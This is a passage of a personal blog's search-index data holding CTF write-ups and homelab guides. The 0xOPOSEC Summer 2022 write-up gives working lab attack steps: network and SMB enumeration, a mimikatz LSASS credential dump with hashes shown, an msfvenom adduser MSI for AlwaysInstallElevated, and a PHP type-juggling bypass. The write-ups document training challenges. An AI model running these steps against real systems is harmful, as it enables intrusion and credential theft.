string was converted to a number before performing the comparison\nKnowing this when we try to attack a PHP application by using a type juggling flaw, we try to exploit this type of unexpected behavior the developers did not think about\nIn the CTF example we had this flaw because they were using == to compare a given password with a string (base64 token).\nKnowing the type of the password, we had to find a value that when compared to a string returned true and after checking php equality charts, we can see that 0 == \u0026quot;xyz\u0026quot; is true, so we could just use {\u0026quot;password\u0026quot;:0} because that would compare with the generated token and return true\nThis could be prevented using ===\nTrivia Who? This was an easy one, just searching the image on google we got the flag lulzsec.\nThe Great Hack \u0026ldquo;How about ensuring that you are a guaranteed winner of a radio contest by controlling all the telephone lines? Imagine, what a classy hack that would be. It took place in real world and the hacker won a costliest prize. What was the costliest prize that the hacker won?\u0026rdquo;\nI searched in google for \u0026ldquo;hacker win radio contest by controlling all the telephone lines\u0026rdquo; and got an article that said \u0026ldquo;It was June 1, 1990, and KIIS-FM was running a competition for callers to win a new Porsche 944 S2\u0026rdquo;.\nPorsche 944 S2 Final result It was a really fun CTF to learn a few neat tricks and it was even cooler for the fact that it came in 2nd place!\n", 
        "url": "http:\/\/localhost:1313\/posts\/2022-12-31-0xoposec\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-01-01-loadbalancing-on-webservers-with-haproxy-and-keepalived\/": {
        "title": "Load Balancing On Webservers with HAProxy and KeepAlived",
        "tags": ["Homelab",],
        "content": "Introduction This presentation is about load balancers and how they are important to new infrastructures. The aim here is to learn more about some network protocols (like VRRP) and how can we maximize the uptime when dealing with webservers. Note that this presentation is in Portuguese. Presentation Resources Note that these resources are in portuguese\nWeb application DB Report ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-01-01-loadbalancing-on-webservers-with-haproxy-and-keepalived\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-08-21-0xoposec\/": {
        "title": "0xOPOSEC Summer Challenge 2022",
        "tags": ["CTF",],
        "content": "\u0026ldquo;Based in Porto, the 0xOPOSEC group was started by g33ks who are passionate about security. The meetup primary mission is to discuss and tackle upsurging security issues by leveraging the expertise and know-how of members of the group.\u0026rdquo;\nFirst recon Larapios Group Access \u0026ldquo;Larapios Group states that they access to our core infrastructure! They claim that our security is lacking and have credentials to access our systems. Quickly, grab the access and gain access to one of the internal machines!\u0026rdquo;\nFirst thing I did was to find all the up hosts and then find more info about those and for that I used nmap $ nmap -sn 192.168.111.0/24 Nmap scan report for 192.168.111.26 Nmap scan report for 192.168.111.30 Nmap scan report for 192.168.111.31 Nmap scan report for 192.168.111.34 Nmap scan report for 192.168.111.36 Nmap scan report for 192.168.111.41 Nmap scan report for 192.168.111.42 $ nmap -O 192.168.111.0/24 Nmap scan report for 192.168.111.26 Host is up (0.035s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open ` 3269/tcp open globalcatLDAPssl 3389/tcp open ms-wbt-server Nmap scan report for 192.168.111.30 Host is up (0.050s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Nmap scan report for 192.168.111.31 Host is up (0.14s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh Nmap scan report for 192.168.111.34 Host is up (0.13s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh Nmap scan report for 192.168.111.36 Host is up (0.14s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Nmap scan report for 192.168.111.41 Host is up (0.049s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Nmap scan report for 192.168.111.42 Host is up (0.15s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server Since this returned so much info I grouped everything by Windows and Linux machines by using the TTL when pinging and got the following 192.168.111.26:Windows 192.168.111.30:Windows 192.168.111.31:Linux 192.168.111.34:Linux 192.168.111.36:Windows 192.168.111.41:Windows 192.168.111.42:Windows Grabing the first machine (Windows) I wanted to enumerate more and since this is most likely using Windows AD why not enumerate for LDAP? After enumerating I got the respective domain bajordas.local and the DC $ sudo nmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; 192.168.111.26 ldapServiceName: bajordas.local:win-dc01$@BAJORDAS.LOCAL Next thing I did was to enumerate all Windows machines for RDP since its a common service used by Windows and doing this got a lot more info like machine names and some juicy info 192.168.111.26 | NetBIOS_Computer_Name: WIN-DC01 | DNS_Computer_Name: WIN-DC01.bajordas.local 192.168.111.30 | NetBIOS_Computer_Name: LAB-SHARE01 | DNS_Computer_Name: LAB-SHARE01.bajordas.local 192.168.111.36 | NetBIOS_Computer_Name: WIN-MGMT | DNS_Computer_Name: WIN-MGMT.bajordas.local 192.168.111.41 | NetBIOS_Computer_Name: LAB-WIN6 | DNS_Computer_Name: LAB-WIN6.bajordas.local 192.168.111.42 | NetBIOS_Computer_Name: LAB-WIN7 | DNS_Computer_Name: LAB-WIN7.bajordas.local Next, but still in the enumeration process I enumerated smb and found powershell scripts on .30 machine $ sudo nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 192.168.111.30 users1.ps1 provisionUsers.ps1 provisionUsers.ps1 had creds for sedalfino net user sedalfino.freitas Summer2022 /add users1.ps1 was a golden mine with more user creds #new joiners net user rogerio.marques Summer2022 /add /domain net user rute.rodrigues Summer2022 /add /domain net user rita.munoiz Summer2022 /add /domain net user renato.recesso Summer2022 /add /domain net user carolina.azevedo Summer2022 /add /domain net user casemiro.silva Summer2022 /add /domain net user jose.borges Summer2022 /add /domain net user stefan.silva Summer2022 /add /domain net user mary.christmas Summer2022 /add /domain net user rodgers.john Summer2022 /add /domain Knowing this I tried to authenticate anonymously on .30 to check those shares $ smbclient --no-pass -L //192.168.111.30/ Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin Admins$ Disk Backups Disk C$ Disk Default share IPC$ IPC Remote IPC Scripts Disk Users Disk After this I tried to the creds I\u0026rsquo;ve found but only sedalfino.freitas were working but still I got the same privileges as anonymous $ smbmap -u \u0026#39;sedalfino.freitas\u0026#39; -p \u0026#39;Summer2022\u0026#39; -d \u0026#39;bajordas\u0026#39; -H 192.168.111.26 After some minutes (hours?) I decided to use xfreerdp and connect to any machine and I was able to do that on .41 but using remmina with sedalfino.freitas:Summer2022 and BAJORDAS.LOCAL creds flag{oneSmallFootInTheEnterprise} Second recon Spread Your Hacks \u0026ldquo;You got in? Noice!\u0026rdquo; \u0026ldquo;I heard they got a special machine for \u0026ldquo;Important People\u0026rdquo;, but they are not very security-focused and their automation is faulty. Can you access it?\u0026rdquo;\nI already enumed a lot for the Windows machines so now I tried to jump to some Linux ones and used enum4linux for that\nenum4linux gave me some creds\n$ enum4linux -u \u0026#34;sedalfino.freitas\u0026#34; -p \u0026#34;Summer2022\u0026#34; -U 192.168.111.26` index: 0x109a RID: 0x454 acb: 0x00000210 Account: big.boss Name: big boss Desc: Password: Money$$$ , make all managers the same password so I have access Using big.boss:Money$$$ I was able to rdp to 192.168.111.41 and 192.168.42\nOn 192.168.111.42 I\u0026rsquo;ve found the flag\nflag{slowMovingRabbit} First Windows Priv Esc Big Dollar Spender \u0026ldquo;You in? Nice! Can you pwn it? Maybe\u0026hellip;\u0026rdquo;\n\u0026ldquo;They installed some shady service and hammered things down to make it work. Maybe it can be exploited in your favour\u0026rdquo;\nWhile doing enumeration and research on 192.168.111.42 i noticed a strange file winPEAS did a great job identifing the strange file permissions After some hours of digging google and trying to understand how could I exploit this, I noticed that I could execute the file\nEverytime I tried executing the file I had an error\nThen I created a malicious .bat file that creates an user and gives permissions to that user but that didn\u0026rsquo;t work either\nNext thing was to use PowerUp\nWith PowerUp executed I noticed a couple stuff i could do like abusing the service bajordas-svc with PowerUp\nAbused the bajordas-svc and got a new user with Admin privileges To sign-in as this user I used rdp and got the flag inside C:\\Users\\Administrator\\Desktop flag{GameOn!} Third recon Other Os Are People 2 \u0026ldquo;Larapios said there are some Linux machines loose in the environment and the System Administrator reuses their credentials 😩.\u0026rdquo;\n\u0026ldquo;Can you access them?\u0026rdquo;\nI jumped to 192.168.111.41 to try to find creds because they could be helpful to the future\nFirst thing I did was to use mimikatz\nFor somereason I had touble using mimikatz to dump some creds, even with the latest version I wasn\u0026rsquo;t lucky\n@darkcookie gave me an hint so I tried to dump the LSASS and then use the minidump to get stored credentials After following the medium guide I got a creds for bacano.do.it and some other known accounts PS C:\\Users\\brun0\\Desktop\u0026gt; .\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53 .## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz \u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com ) \u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/ mimikatz # lsadump::trust /patch mimikatz # sekurlsa::minidump C:\\Users\\brun0\\AppData\\Local\\Temp\\lsass.DMP Switch to MINIDUMP : \u0026#39;C:\\Users\\brun0\\AppData\\Local\\Temp\\lsass.DMP\u0026#39; mimikatz # sekurlsa::logonpasswords Opening : \u0026#39;C:\\Users\\brun0\\AppData\\Local\\Temp\\lsass.DMP\u0026#39; file for minidump... User Name : rogerio.marques Domain : BAJORDAS Logon Server : WIN-DC01 Logon Time : 8/23/2022 10:11:40 PM SID : S-1-5-21-705575555-4224697876-3339875019-1121 msv : [00000003] Primary * Username : rogerio.marques * Domain : BAJORDAS * NTLM : a3d7d25665f1146b56192b850fd57a93 * SHA1 : 78936dac0d808daf0f58313fa74666ef26b41e40 * DPAPI : 6ccf347c45ff34bd7211b7d286a25d23 kerberos : * Username : rogerio.marques * Domain : BAJORDAS.LOCAL * Password : Summer2022 Authentication Id : 0 ; 440390 (00000000:0006b846) Session : RemoteInteractive from 3 User Name : Administrator Domain : LAB-WIN6 Logon Server : LAB-WIN6 Logon Time : 8/22/2022 10:52:50 PM SID : S-1-5-21-4139696292-2348944387-3964195370-500 msv : tspkg : wdigest : kerberos : ssp : credman : [00000000] * Username : BAJORDAS\\bacano.do.it * Domain : BAJORDAS\\bacano.do.it * Password : ViniVidiVici420! Next thing I did was to login with ssh in 192.168.111.31 with bacano.do.it and I got the flag flag{pinguinsRPeople2} There was another challenge called Shells, Shells, Shells but I got the flag on this one too by using ssh in 192.168.111.34 with the same creds of bacano.do.it flag{OneMore4TheRoad} First Linux Priv Esc CAPtain Pwn! \u0026ldquo;The System Administrator was having trouble getting scripts to run but found a way to always work!\u0026rdquo;\n\u0026ldquo;Can you abuse the misconfiguration and pwn the machine?\u0026rdquo;\nNow was time to privesc the Linux box .31 so for that I ran linpeas\nThe output of linpeas gave me a cool finding about /usr/bin/python3.8 = cap_setuid+ep\nAs the blog post stated \u0026ldquo;As we know when the system creates a work context for each user where they achieve their tasks with the privileges that are assigned to them. So, to provide some specific functionalities, it is necessary for a non-privileged user to sometimes temporarily acquire a superuser profile to perform a specific task. This functionality mainly can be achieved by assigning privileges through sudo, or setuid permissions to an executable file which allows the user to adopt the role of the file owner. To accomplish the same task in a more secure way the system admin uses “capability” which plays an effective role in the security of Linux based operating systems.\u0026rdquo;\nKnowing this It\u0026rsquo;s clear I can execute python (and that will have the setuid bit set) with root privileges, so It\u0026rsquo;s trivial to spawn a shell as root\nflag{HelloCAPtain} Second Linux Priv Esc SO Cute! \u0026ldquo;Infrastructure logs show a weird behaviour on one binary left in the server but we couldn\u0026rsquo;t discover how can we abuse it to render the server to its knees. Everything is patched so there will be a challenge.\u0026rdquo;\n\u0026ldquo;Can you analyze the server and look for ways to overcome its security?\u0026rdquo;\nThe description is straight forward that I need to dig into the logs\nSo knowing this I started to search on linux logs (spent quite some time in this process)\nNavigating to /usr/sbin I found an interesting binary\nI searched for this binary on google and I found nothing so I assume that this was a crafted binary to this challenge\nRunning the binary gave me the following output\nUnfortunately I was stuck for a long time on this challenge trying to break it without success so I wasn\u0026rsquo;t able to get the flag Second Windows Priv Esc Stairway To Heaven \u0026ldquo;Larapios Group states that they can completely compromise the machine and gain Administrator access through a misconfiguration!\u0026rdquo;\nSo I moved to 192.168.111.41 and after some minutes of enumeration I decided to run winpeas\nwinpeas returned an interesting finding, alwaysinstalledelevated was set to 1 so I could exploit this with a crafted .msi file\nI setuped a .msi file using msfvenom -p windows/adduser USER=brun0 PASS=n0tSoSecure! -f msi -o alwe.msi and then I uploaded that .msi file to 192.168.111.41\nThen I executed the file from the windows box and then typed net user and found that brun0 was a valid user\nNext I did a rdp connection with the new user created to the target machine and I was able to get the Administrator flag in C:\\Users\\Administrator\\Desktop\nflag{wholeLegInTheEnterprise} Conclusion This was my come back to 0XOPOSEC Summer Challenge (last I did was in 2019) and to be fair I realy liked It because It was more realistic as we could exploit linux machines and windows machines and jump from one to another. A recommendation for the next one would be to have a more defined path because there was an handful of achines and the challenges asked for a flag but we had to find what machine should we exploit to get the flag to that specific challenge. Other than that was a realy fun one so next is the Christmas challenge!\n", 
        "url": "http:\/\/localhost:1313\/posts\/2022-08-21-0xoposec\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2022-02-24-0xoposec\/": {
        "title": "0xOPOSEC 24\/02\/2022 Challenge",
        "tags": ["CTF",],
        "content": "Description \u0026ldquo;I just got this new keyboard from Vodaphone Portugal, but it looks like something fishy is going on. Could you help me?\u0026rdquo;\nSolving Opening the pcap file It turns out to be a USB communication capture The file was small and had USB_INTERRUPT events that encode key presses\nAfter a little bit of google fu, I found that the Leftover Capture Data field has a series of 8 bytes strung together (the third byte is the Usage ID for the key pressed)\nSo one way to decode this was to look at Leftover Capture Data and convert the key presses to human readable output\nKnowing this I extracted all Leftover Capture Data from the pcap file (tshark -r dump.pcapng -T fields -e usb.capdata | grep .) and created a python script to help me decode the dumped data\nOutput from the tshark command\n01000900 01000000 01000f00 01000000 01000400 01000000 01000a00 01000000 01202f00 ... 01000000 01203000 01200000 01002800 01000000 #!/usr/bin/python3 import sys lower_case_key = { 1:None,\t2:None,\t3:None,\t4:\u0026#34;a\u0026#34;,\t5:\u0026#34;b\u0026#34;,\t6:\u0026#34;c\u0026#34;, 7:\u0026#34;d\u0026#34;, 8:\u0026#34;e\u0026#34;,\t9:\u0026#34;f\u0026#34;, 10:\u0026#34;g\u0026#34;,\t11:\u0026#34;h\u0026#34;,\t12:\u0026#34;i\u0026#34;, 13:\u0026#34;j\u0026#34;,\t14:\u0026#34;k\u0026#34;,\t15:\u0026#34;l\u0026#34;,\t16:\u0026#34;m\u0026#34;,\t17:\u0026#34;n\u0026#34;,\t18:\u0026#34;o\u0026#34;, 19:\u0026#34;p\u0026#34;,\t20:\u0026#34;q\u0026#34;,\t21:\u0026#34;r\u0026#34;,\t22:\u0026#34;s\u0026#34;,\t23:\u0026#34;t\u0026#34;,\t24:\u0026#34;u\u0026#34;, 25:\u0026#34;v\u0026#34;,\t26:\u0026#34;w\u0026#34;,\t27:\u0026#34;x\u0026#34;,\t28:\u0026#34;y\u0026#34;,\t29:\u0026#34;z\u0026#34;,\t30:\u0026#34;1\u0026#34;, 31:\u0026#34;2\u0026#34;,\t32:\u0026#34;3\u0026#34;,\t33:\u0026#34;4\u0026#34;,\t34:\u0026#34;5\u0026#34;,\t35:\u0026#34;6\u0026#34;,\t36:\u0026#34;7\u0026#34;, 37:\u0026#34;8\u0026#34;,\t38:\u0026#34;9\u0026#34;,\t39:\u0026#34;0\u0026#34;,\t40:\u0026#34;Enter\u0026#34;,\t41:\u0026#34;esc\u0026#34;,42:\u0026#34;del\u0026#34;, 43:\u0026#34;tab\u0026#34;, 44:\u0026#34;space\u0026#34;,\t45:\u0026#34;-\u0026#34;, 46:\u0026#34;:\u0026#34;, 47:\u0026#34;[\u0026#34;, 48:\u0026#34;]\u0026#34;, 49:\u0026#34;\\\\\u0026#34;,50:\u0026#34; \u0026#34;, 51:\u0026#34;,\u0026#34;, 52:\u0026#34;\u0026#39;\u0026#34;, 53:\u0026#34;`\u0026#34;, 54:\u0026#34;,\u0026#34;, 55:\u0026#34;.\u0026#34;, 56:\u0026#34;/\u0026#34;, 57:\u0026#34;CapsLock\u0026#34;, 79:\u0026#34;RightArrow\u0026#34;,80:\u0026#34;LeftArrow\u0026#34;, 84:\u0026#34;/\u0026#34;, 85:\u0026#34;*\u0026#34;, 86:\u0026#34;-\u0026#34;,\t87:\u0026#34;+\u0026#34;, 88:\u0026#34;Enter\u0026#34;, 89:\u0026#34;1\u0026#34;, 90:\u0026#34;2\u0026#34;, 91:\u0026#34;3\u0026#34;, 92:\u0026#34;4\u0026#34;,\t93:\u0026#34;5\u0026#34;, 94:\u0026#34;6\u0026#34;,\t95:\u0026#34;7\u0026#34;, 96:\u0026#34;8\u0026#34;, 97:\u0026#34;9\u0026#34;, 98:\u0026#34;0\u0026#34;, 99:\u0026#34;.\u0026#34; } upper_case_key = { 1:None, 2:None, 3:None,5:\u0026#34;B\u0026#34;, 6:\u0026#34;C\u0026#34;,7:\u0026#34;D\u0026#34;,8:\u0026#34;E\u0026#34;, 9:\u0026#34;F\u0026#34;,10:\u0026#34;G\u0026#34;,11:\u0026#34;H\u0026#34;,12:\u0026#34;I\u0026#34;,13:\u0026#34;J\u0026#34;,14:\u0026#34;K\u0026#34;, 15:\u0026#34;L\u0026#34;,\t16:\u0026#34;M\u0026#34;,\t17:\u0026#34;N\u0026#34;,\t18:\u0026#34;O\u0026#34;,\t19:\u0026#34;P\u0026#34;,\t20:\u0026#34;Q\u0026#34;, 21:\u0026#34;R\u0026#34;,\t22:\u0026#34;S\u0026#34;,\t23:\u0026#34;T\u0026#34;,\t24:\u0026#34;U\u0026#34;,\t25:\u0026#34;V\u0026#34;,\t26:\u0026#34;W\u0026#34;, 27:\u0026#34;X\u0026#34;,\t28:\u0026#34;Y\u0026#34;,\t29:\u0026#34;Z\u0026#34;,\t30:\u0026#34;!\u0026#34;,\t31:\u0026#34;@\u0026#34;,\t32:\u0026#34;#\u0026#34;, 33:\u0026#34;$\u0026#34;,\t34:\u0026#34;%\u0026#34;,\t35:\u0026#34;^\u0026#34;,\t36:\u0026#34;\u0026amp;\u0026#34;,\t37:\u0026#34;*\u0026#34;,\t38:\u0026#34;(\u0026#34;, 39:\u0026#34;)\u0026#34;,\t40:\u0026#34;Enter\u0026#34;,41:\u0026#34;esc\u0026#34;,42:\u0026#34;del\u0026#34;,43:\u0026#34;tab\u0026#34;,44:\u0026#34;space\u0026#34;, 45:\u0026#34;_\u0026#34;,\t46:\u0026#34;+\u0026#34;,\t47:\u0026#34;{\u0026#34;,\t48:\u0026#34;}\u0026#34;,\t49:\u0026#34;|\u0026#34;,\t50:\u0026#34; \u0026#34;, 51:\u0026#34;:\u0026#34;,\t52:\u0026#34;\\\u0026#34;\u0026#34;,53:\u0026#34;~\u0026#34;,54:\u0026#34;\u0026lt;\u0026#34;,55:\u0026#34;\u0026gt;\u0026#34;,\t56:\u0026#34;?\u0026#34;, 57:\u0026#34;CapsLock\u0026#34;,79:\u0026#34;RightArrow\u0026#34;,80:\u0026#34;LeftArrow\u0026#34;, 84:\u0026#34;/\u0026#34;,\t85:\u0026#34;*\u0026#34;,\t86:\u0026#34;-\u0026#34;,\t87:\u0026#34;+\u0026#34;,\t88:\u0026#34;Enter\u0026#34;,\t89:\u0026#34;1\u0026#34;, 90:\u0026#34;2\u0026#34;,\t91:\u0026#34;3\u0026#34;,\t92:\u0026#34;4\u0026#34;,\t93:\u0026#34;5\u0026#34;,\t94:\u0026#34;6\u0026#34;,\t95:\u0026#34;7\u0026#34;, 96:\u0026#34;8\u0026#34;,\t97:\u0026#34;9\u0026#34;,\t98:\u0026#34;0\u0026#34;,99:\u0026#34;.\u0026#34; } def replace(res : str)-\u0026gt; str: return res.replace(\u0026#34;[\u0026#34;,\u0026#34;{\u0026#34;).replace(\u0026#34;]\u0026#34;,\u0026#34;}\u0026#34;).replace(\u0026#34;-\u0026#34;,\u0026#34;_\u0026#34;) def main() -\u0026gt; str: res = \u0026#34;\u0026#34; if len(sys.argv) == 2: # open file with \u0026#34;Leftover Capture Data\u0026#34; field from pcap with open(sys.argv[1]) as keycodes: for line in keycodes: # convert string to bytearray bytesArray = bytearray.fromhex(line.strip()) # see if a key was pressed(range goes from 4 to 99) key_press = int(bytesArray[2]) if key_press \u0026gt; 3 and key_press \u0026lt; 100: # see if left shift or right shift was presses if bytesArray[0] == 0x02 or bytesArray[0] == 0x20 : res += upper_case_key[key_press] else: res += lower_case_key[key_press] else: print(\u0026#34;python3 exploit.py file\u0026#34;) return replace(res) if __name__ == \u0026#34;__main__\u0026#34;: print(main()) flag{usb_sniff_sniff} References https://www.usb.org/sites/default/files/documents/hid1_11.pdf https://source.android.com/devices/input/keyboard-devices.html ", 
        "url": "http:\/\/localhost:1313\/posts\/2022-02-24-0xoposec\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2021-07-29-using-ansible-to-deploy-vm-in-esxi\/": {
        "title": "Using Ansible To Deploy a VM In ESXi",
        "tags": ["Homelab",],
        "content": "Introduction After configuring ESXi and deploying some virtual machines, I felt the need to automate the process of creating VMs since most of the times I need to spin up a clean machine just for testing some stuff and making the same process over and over again is time consuming and boring.\nThis is why I took some time to learn Ansible, so I could just create a playbook and the VM would be up and running.\nAfter some time and a lot of googling I found that since I am using ESXi free version I had to use an iso file instead of a template for the VM creation. This minor detail was really important because using the template would never work without a vCenter instance.\nSo the plan was to have an iso file in a datastore (in this example I will be using Ubuntu OS), configure ESXi host and a VM that runs Ansible.\nFor this to work the VM has to be running Ansible \u0026gt; 2.10 since previous versions don\u0026rsquo;t support SATA.\nConfiguration Configure ESXi In the ESXi server the only thing I did was, reconfigure ssh to be able to root login, authenticate with a public key and disable the password authentication method. For that I edited the /etc/ssh/sshd_config file by adding the following commands:\nPermitRootLogin yes PubkeyAuthentication yes PasswordAuthentication no Configure Host Machine The host machine used (this is where Ansible is running) was Ubuntu 20.04.2 LTS for the sake of simplicity.\nHere I created a ssh key to authenticate in ESXI without the need of a password in the ssh connection.\nssh-keygen -t rsa cat ~/.ssh/id_rsa.pub | ssh ESXI_USER@ESXI_IP \u0026#39;cat \u0026gt;\u0026gt; /etc/ssh/keys-root/authorized_keys\u0026#39; Next step was to install Ansible and make sure the version was \u0026gt; 2.10.\npip3 install ansible-core ansible --version Before creating the playbook I had to configure some values in an hosts file. In this way Ansible knows what is the host used for the playbook and what configurations needs in run time. For that I had to create the hosts file inside /etc/ansible/ directory with the following content:\n[esxi] \u0026lt;ip of the esxi host\u0026gt; [esxi:vars] ansible_python_interpreter=/usr/bin/python3 ansible_connection=ssh ansible_user=root ansible_ssh_private_key_file=~/.ssh/id_rsa Create The Playbook \u0026ldquo;Playbooks are expressed in YAML format with a minimum of syntax. A playbook is composed of one or more ‘plays’ in an ordered list. The terms ‘playbook’ and ‘play’ are sports analogies. Each play executes part of the overall goal of the playbook, running one or more tasks. Each task calls an Ansible module.\u0026rdquo;\nTo interact with an ESXi instance I used the community.vmware.vmware_guest module that is used to manage virtual machines in vCenter. Reading the documentation is pretty straight forward how the module works.\nFirst I specified the host (localhost because it\u0026rsquo;s already specified in the hosts file), then I needed to say what task I was going to run (vmware_guest module). Inside that task I identified every attribute I wanted to be present in the virtual machine. Finally I delegated the task to localhost and registered as deploy_vm.\n--- - hosts: localhost gather_facts: False tasks: - name: Create a VM in ESXi vmware_guest: hostname: \u0026lt;ip of ESXi\u0026gt; username: \u0026lt;username of ESXi\u0026gt; password: \u0026lt;password of ESXi\u0026gt; validate_certs: False folder: /ha-datacenter/vm name: \u0026lt;vm-name\u0026gt; state: present guest_id: ubuntu64Guest esxi_hostname: \u0026lt;hostname of ESXi\u0026gt; disk: - size_gb: 100 type: thin datastore: \u0026lt;relative path of datastore, like \u0026#34;[HDD1]\u0026#34;\u0026gt; hardware: memory_mb: 8192 num_cpus: 4 scsi: lsilogicsas cdrom: - controller_number: 0 unit_number: 0 state: present type: iso iso_path: \u0026lt;relative path + iso name, like \u0026#34;[HDD1] debian-10.5.0-amd64-DVD-1.iso\u0026#34;\u0026gt; networks: - name: VM Network type: static start_connected: true ip: \u0026lt;ip\u0026gt; netmask: \u0026lt;netmask\u0026gt; gateway: \u0026lt;gateway\u0026gt; customization: hostname: \u0026lt;vm-name\u0026gt; dns_servers: - 8.8.8.8 - 8.8.4.4 delegate_to: localhost register: deploy_vm Final Result Finally the last thing was to execute the playbook using ansible-playbook \u0026lt;playbook name\u0026gt;.\nDoing this was extremely helpful because now I can spin up virtual machines (either Windows or Linux) in a faster and easier way.\nReferences https://www.ansible.com/ https://www.redhat.com/en/blog/ansible-101-ansible-beginners https://www.ansible.com/integrations/infrastructure/vmware https://docs.ansible.com/ansible/latest/collections/community/vmware/vmware_guest_module.html ", 
        "url": "http:\/\/localhost:1313\/posts\/2021-07-29-using-ansible-to-deploy-vm-in-esxi\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2021-07-22-my-esxi-server\/": {
        "title": "My ESXi Server",
        "tags": ["Homelab",],
        "content": "Introduction Since I joined college I had a need to have more than one operating system available for some classes so I had a few options.\nFirst I could simply run Oracle VM VirtualBox or VMware Workstation Player. This would work but since I have a ThinkPad X1 Carbon Gen5, it wouldn\u0026rsquo;t handle every ram and cpu usage from the VMs.\nThe second option would be to buy a new laptop but i didn\u0026rsquo;t want to overuse it.\nSo the third option, the one I choosed, was to buy a refurbished server and install ESXi or Proxmox creating a virtualization server giving more lifetime to the laptop.\nAfter looking for a few weeks, I found Bargain Hardware. Bargain Hardware is an awesome website with realy cool prices. I was looking for a Dell product after reading Reddit\u0026rsquo;s reviews but I only found rack servers and a rack server would not fit since I dont have a rack. So I moved to HP products and found HP Z620. Two weeks have passed by and the server had arrived.\nHP Z620 Specifications Hardware Brand CPU 2x Xeon E5-2670 2.60GHz Eight 8-Core RAM 24 GB RAM 1600MHz Kingston GPU ATI Radeon HD-3470 256 MB GDDR2 I added two Western Digital 500 GB HDDs and one Samsung Evo 500 GB SSD that I had in another workstation.\nThen I needed to choose between ESXi or Proxmox. After reading some tips from a few forums I choosed ESXi for two reasons. First I could run ESXi from a usb stick since ESXi OS goes to RAM on boot making almost no read/writes into the usb stick and the second reason was that VMware is well known and has a bigger community making easier to find help online.\nThen I had to see if the hardware of the server was compatible with ESXi, and it wasn\u0026rsquo;t (NIC was not compatible) but then I found some custom ESXi ISOs. The next step was to make a bootable usb using the custom iso and for that I used etcher.\nESXi boots up and the only thing I needed to change was the ip address and make sure the NIC was working properly with the custom iso (I could see the NIC was working because it reached my home router).\nAfter making that, the server was up and running like a charm and the next step was to create some VMs.\nBackup ESXi Host Having healthy ESXi hosts is a key to success when running virtual machines. That’s why it is better to back up ESXi configuration. Thus, if something goes wrong with an ESXi host, its configuration can be restored in a few minutes without spending a lot of time to configure an ESXi server from scratch.\nUsing ESXi Command Line To Backup ESXi Host ESXi configuration is saved every hour automatically to the /bootblank/state.tgz file. So I needed to run two commands, one to do the backup and the other one to get a link to the specific backup.\nvim-cmd hostsvc/firmware/sync_config vim-cmd hostsvc/firmware/backup_config Then I downloaded the tgz file stored in /scratch/downloads.\nAutomate The Backup Create a directory to store backup files on your ESXi datastore mkdir /vmfs/volumes/datastore1/ESXi_backup Create a script to backup ESXi configuration vi /vmfs/volumes/datastore1/ESXi_backup/esxi_backup.sh Add the following lines to the script vim-cmd hostsvc/firmware/sync_config vim-cmd hostsvc/firmware/backup_config find /scratch/downloads/ -name \\*.tgz -exec cp {} /vmfs/volumes/datastore1/ESXi_backup/ESXi_config_backup_$(date +\u0026#39;%Y%m%d_%H%M%S\u0026#39;).tgz \\; Make the script executable chmod +x /vmfs/volumes/datastore1/ESXi_backup/esxi_backup.sh Run the script cd /vmfs/volumes/datastore1/ESXi_backup/ ./esxi_backup.sh Edit scheduler to make sure the backup ESXi host script is running automatically vi /var/spool/cron/crontabs/root Add the following string to backup everyday at 02:10 AM and save the changes 10 02 * * * /vmfs/volumes/datastore1/ESXi_backup/esxi_backup.sh Monitoring ESXi Even having a nice UI in VMware ESXi Web Interface I had to monitor ESXi outside of my LAN and, for security reasons, I didn\u0026rsquo;t want to make the server public to the WAN so I made a python script to help me on that job. The script can be find on my TelegramBot repository.\nReferences https://www.vmware.com/products/esxi-and-esx.html https://www.pendrivelinux.com/etcher-usb-iso-burner-and-clone-tool/ https://www.bargainhardware.co.uk/ http://www.fabfile.org/ ", 
        "url": "http:\/\/localhost:1313\/posts\/2021-07-22-my-esxi-server\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2018-08-21-0xoposec\/": {
        "title": "0xOPOSEC Summer Challenge 2018",
        "tags": ["CTF",],
